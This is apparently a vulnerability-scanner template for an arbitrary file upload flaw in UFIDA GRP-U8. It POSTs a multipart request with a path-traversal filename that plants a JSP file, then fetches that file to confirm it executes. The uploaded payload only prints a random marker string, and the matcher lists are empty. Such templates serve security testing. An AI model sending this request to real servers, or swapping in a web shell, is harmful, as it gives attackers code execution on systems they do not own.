id: grp-u8-uploadfiledata
brief:
    title: UFIDA GRP-U8 UploadFileData - Arbitrary File Upload
    by: SleepingBag945
    level: critical
    about: File upload vulnerability in UFIDA U8+ERP customer relationship management software. An attacker can use this vulnerability to gain control of the server.
    label:
        - yonyou
        - fileupload
        - grp
        - intrusive
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/UploadFileData?action=upload_file&filename=../{{randstr_1}}.jsp'
      head:
        Accept: '*/*'
        Accept-Encoding: gzip
        Content-Length: "327"
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqoqnjtcw
      body: |-
        ------WebKitFormBoundaryqoqnjtcw
        Content-Disposition: form-data; name="upload"; filename="emgeyr.jsp"
        Content-Type: application/octet-stream

        <% {out.print("{{randstr_2}}");} %>
        ------WebKitFormBoundaryqoqnjtcw
        Content-Disposition: form-data; name="submit"

        submit
        ------WebKitFormBoundaryqoqnjtcw--
      signs: []
    - verb: GET
      to:
        - '{{BaseURL}}/R9iPortal/{{randstr_1}}.jsp'
      head:
        Accept-Encoding: gzip
      signs: []
